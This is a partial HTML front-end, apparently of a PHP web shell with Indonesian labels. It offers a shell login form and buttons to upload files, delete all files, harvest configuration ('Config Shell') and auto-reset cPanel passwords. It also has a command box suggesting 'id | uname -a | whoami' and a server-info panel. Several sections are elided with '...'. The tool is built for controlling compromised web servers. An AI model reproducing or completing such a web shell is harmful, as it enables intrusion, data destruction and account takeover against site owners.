...
<html>
	...
	<center>
		<img src="https://raw.githubusercontent.com/Ardhiazz/project-gabut/main/sharingan.webp"/>
		</center>
		<center>
			<div class="container">
				<div class="col-lg-6">
					<div class="form-group">
						<form method="post">
							...
							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="LOGIN SHELL">
						</form>
					</div>
		</center>
		...
		<div class="container">
			...
			<div class="text-center">
				<div class="d-flex justify-content-center flex-wrap">
					<a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> </a>
					<a href="?dir='.$dir.'&aksi=upload" class="fiture btn btn-danger btn-sm"><i class="fa fa-upload"></i> Upload File</a>
					...
					<a href="?dir='.$dir.'&aksi=masdel" class="fiture btn btn-danger btn-sm"><i class="fa fa-trash"></i> Delete All File</a>

					<a href="?dir='.$dir.'&aksi=config" class="fiture btn btn-danger btn-sm"><i class="fa fa-cogs"></i> Config Shell</a>
					<a href="?dir='.$dir.'&aksi=resetpasscp" class="fiture btn btn-warning btn-sm"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
					<a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> keluar Dan Hapus Shell</a>
				</div>
			</div>
			<div class="row">
				<div class="col-lg-4"><br/>
					<h5><i class="fa fa-terminal"></i> Comands </h5>
					<form>
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | Dll">
					</form>
					<hr style="backgroud: white"/>
					<h5><i class="fa fa-search"></i> Info Server </h5>
